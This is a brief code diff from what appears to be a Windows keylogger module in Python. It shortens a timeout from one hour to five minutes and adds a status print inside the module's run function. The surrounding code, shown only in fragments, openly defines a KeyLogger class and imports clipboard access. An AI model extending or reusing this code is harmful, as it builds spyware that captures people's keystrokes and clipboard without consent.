@@ -8,7 +8,7 @@ import time
 import win32clipboard
 
 
-TIMEOUT = 60 * 60
+TIMEOUT = 60 * 5
 
 class KeyLogger:
     def __init__(self):
@@ -63,6 +63,7 @@ class KeyLogger:
         return True
 
 def run():
+    print("[*] In Keylogger module.")
     save_stdout = sys.stdout
     sys.stdout = StringIO()
 
